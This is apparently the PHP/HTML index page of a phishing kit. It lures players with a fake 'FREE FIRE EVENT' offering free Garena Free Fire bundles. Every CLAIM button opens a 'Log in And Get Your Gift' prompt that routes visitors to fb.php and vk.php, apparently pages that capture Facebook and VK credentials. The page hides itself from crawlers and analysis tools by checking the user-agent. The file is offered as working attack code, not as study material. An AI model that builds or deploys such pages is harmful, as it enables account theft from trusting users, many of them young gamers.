<?php 
session_start();
session_destroy();
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<noscript><H1><CENTER>IDHAAM69@CRAZYTYPER.INFO</CENTER></H1></noscript>
	
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <title>FREE FIRE EVENT</title>
    <meta property="og:description" content="Get Free Bundle Garena Free Fire in Here !!">
    <meta property="og:image" content="idhmxd/images/banner.png">
    <link rel="shorcut icon" href="idhmxd/images/icon.png">
    <link rel="stylesheet" type="text/css" href="idhmxd/css/style.css">
    <link rel="stylesheet" type="text/css" href="idhmxd/css/animate.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script type="text/javascript" src="idhmxd/js/idhaampedia.js"></script>
</head>
<body>
	<div id="bg"></div>
	<div id="idhaampedia">
		<div class="header">
			<img class="logo" src="idhmxd/images/logo-small.png">
		</div>
		<div class="content">
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/sans1.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/sans2.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/sans3.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/sans4.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/sans5.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/sans6.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
		</div>
		<div id="login">
			<div class="animated slideInUp login">
				<div class="txt-login">- Log in And Get Your Gift -</div>
				<div class="pilihan">
					<div class="box-pilihan" onclick="location.href='fb.php';">
						<img class="img-box-pilihan" src="idhmxd/images/fb.png">
						<span class="txt-box-pilihan">Facebook</span>
					</div>
					<div class="box-pilihan" onclick="location.href='vk.php';">
						<img class="img-box-pilihan" src="idhmxd/images/vk.png">
						<span class="txt-box-pilihan">VK</span>
					</div>
				</div>
				<hr class="garis-pilihan">
				<button class="btn-pilihan" onclick="tutup()">Back</button>
			</div>
		</div>
	</div>
	<script type="text/javascript" src="idhmxd/js/antianti.js"></script>
</body>
</html>